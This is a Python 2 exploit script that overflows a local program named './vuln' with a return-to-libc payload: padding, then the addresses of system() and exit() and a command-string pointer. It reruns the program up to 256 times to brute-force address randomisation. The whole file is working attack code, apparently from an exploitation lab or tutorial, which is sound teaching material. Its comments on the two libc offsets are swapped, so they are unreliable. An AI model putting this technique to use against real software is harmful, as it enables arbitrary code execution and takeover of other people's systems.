#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

libc_base_addr = 0xb7595000
exit_off = 0x00032be0             #Obtained from "readelf -s libc.so.6 | grep system" command.
system_off = 0x0003f060           #Obtained from "readelf -s libc.so.6 | grep exit" command.
system_addr = libc_base_addr + system_off
exit_addr = libc_base_addr + exit_off
system_arg = 0x804827d

#endianess convertion
def conv(num):
 return struct.pack("<I",num)

# Junk + system + exit + system_arg
buf = "A" * 268
buf += conv(system_addr)
buf += conv(exit_addr)
buf += conv(system_arg)

print "Calling vulnerable program"
#Multiple tries until we get lucky
i = 0
while (i < 256):
 print "Number of tries: %d" %i
 i += 1
 ret = call(["./vuln", buf])
 if (not ret):
  break
 else:
  print "Exploit failed"
